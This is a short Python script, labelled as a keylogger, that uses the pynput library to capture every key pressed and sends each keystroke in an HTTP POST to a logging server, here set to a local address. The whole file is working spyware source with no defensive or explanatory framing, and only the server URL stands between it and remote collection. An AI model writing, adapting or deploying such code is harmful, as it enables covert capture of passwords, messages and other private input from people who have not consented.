import requests
from pynput import keyboard

def send_log(log):
    try:
        response = requests.post("http://127.0.0.1:5000/send_log", json={"log": log})
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"Error connecting to server: {e}")

def on_press(key):
    try:
        send_log(f'{key.char}')  # Convert key to string
    except AttributeError:
        send_log(f'Key {key} pressed.')

# Start the keylogger
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
